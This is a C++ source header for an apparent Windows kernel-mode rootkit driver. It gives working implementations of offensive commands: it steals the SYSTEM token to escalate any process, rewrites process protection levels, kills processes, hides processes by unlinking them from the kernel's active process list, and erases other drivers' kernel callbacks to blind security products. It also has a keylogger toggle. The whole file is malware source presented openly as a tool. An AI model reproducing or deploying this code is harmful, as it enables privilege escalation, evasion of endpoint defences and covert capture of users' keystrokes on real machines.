#pragma once

#include <ntifs.h>
#include <wdf.h>

#include "Globals.hpp"
#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "AddressUtils.hpp"
#include "Vector.hpp"
#include "CallbackUtils.hpp"
#include "AutoLock.hpp"

// --------------------------------------------------------------------------------------------------------

NTSTATUS BeCmd_KillProcess(HANDLE pid);
NTSTATUS BeCmd_ProtectProcess(ULONG pid, BYTE newProcessProtection);
NTSTATUS BeCmd_ElevateProcessAcessToken(HANDLE pid);
NTSTATUS BeCmd_KillProcess(HANDLE pid);
NTSTATUS BeCmd_HideProcess(HANDLE pid);
ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(CALLBACK_TYPE callbackType);
NTSTATUS BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType);
NTSTATUS BeCmd_StartKeylogger(BOOLEAN start);

// --------------------------------------------------------------------------------------------------------

/**
 * Method for setting the protection of an arbitrary process by PID.
 *
 * @param pid PID of the target process
 * @param newProtectionLevel new level of protection to apply
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_ProtectProcess(ULONG pid, BYTE newProtectionLevel)
{
    LOG_MSG("Changing pid %i protection to %i\r\n", pid, newProtectionLevel);

    // Lookup process
    PEPROCESS process = BeGetEprocessByPid(pid);
    if (process == NULL)
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();

    LOG_MSG("Current protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));

    // assign new protection level
    *((BYTE*)(EProtectionLevel)) = newProtectionLevel;

    LOG_MSG("New protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));

    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

/**
 * Sets target process access token to a SYSTEM token.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_ElevateProcessAcessToken(HANDLE pid)
{
    PEPROCESS privilegedProcess, targetProcess;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    ULONG tokenOffset = BeGetAccessTokenOffset();

    // Lookup target process
    NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
    if (NtStatus != 0)
    {
        LOG_MSG("PID %i not found\r\n", HandleToUlong(pid));
        ObDereferenceObject(targetProcess);
        return NtStatus;
    }

    // Lookup system process (handle for pid 4)
    NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
    if (NtStatus != 0)
    {
        LOG_MSG("System process not found with pid 4\r\n");
        ObDereferenceObject(privilegedProcess);
        ObDereferenceObject(targetProcess);
        return NtStatus;
    }

    //LOG_MSG("Token Target: %i", (ULONG)targetProcess + tokenOffset);
    //LOG_MSG("Token System: %i", (ULONG)privilegedProcess + tokenOffset);

    // Replace target process token with system token
    *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);

    ObDereferenceObject(privilegedProcess);
    ObDereferenceObject(targetProcess);
    return NtStatus;
}

/**
 * Kills a process by PID.
 *
 * @param pid PID of the process to kill
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_KillProcess(HANDLE pid)
{
    HANDLE hProcess = NULL;

    PEPROCESS prc = BeGetEprocessByPid(HandleToULong(pid));
    if (prc == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }
    ObDereferenceObject(prc);

    CLIENT_ID ci;
    ci.UniqueProcess = pid;
    ci.UniqueThread = 0;

    OBJECT_ATTRIBUTES obj;
    obj.Length = sizeof(obj);
    obj.Attributes = 0;
    obj.ObjectName = 0;
    obj.RootDirectory = 0;
    obj.SecurityDescriptor = 0;
    obj.SecurityQualityOfService = 0;

    BeGlobals::pZwOpenProcess(&hProcess, 1, &obj, &ci);
    NTSTATUS NtStatus = BeGlobals::pZwTerminateProcess(hProcess, 0);
    BeGlobals::pZwClose(hProcess);

    LOG_MSG("KillProcess %i \r\n", NtStatus);
    return NtStatus;
}

/**
 * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_HideProcess(HANDLE pid)
{
    PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
    if (targetProcess == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    {
        AutoLock<FastMutex> _lock(BeGlobals::processListLock);
        PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
        RemoveEntryList(processListEntry);
    }
    
    ObDereferenceObject(targetProcess);
    return STATUS_SUCCESS;
}

/**
 * Enumerates kernel callbacks
 *
 * @param type Type of callback to resolve
 * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
 */
ktd::vector<CALLBACK_DATA, PagedPool>
BeCmd_EnumerateCallbacks(CALLBACK_TYPE type)
{
    return BeEnumerateKernelCallbacks(type);
}

/**
 * Replaces all kernel callbacks of a specified driver with empty callbacks.

 * @param targetDriver Name of target driver
 * @param cbType type of callback to remove
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, cbType);

    return NtStatus;
}

/**
 * Starts or stops the keylogger.
 *
 * @param start TRUE to start, FALSE to stop
 * @return NTSTATUS status code.
 */
NTSTATUS
BeCmd_StartKeylogger(BOOLEAN start)
{
    BeGlobals::logKeys = start;
    LOG_MSG("Log keys: %d\n", start);

    return STATUS_SUCCESS;
}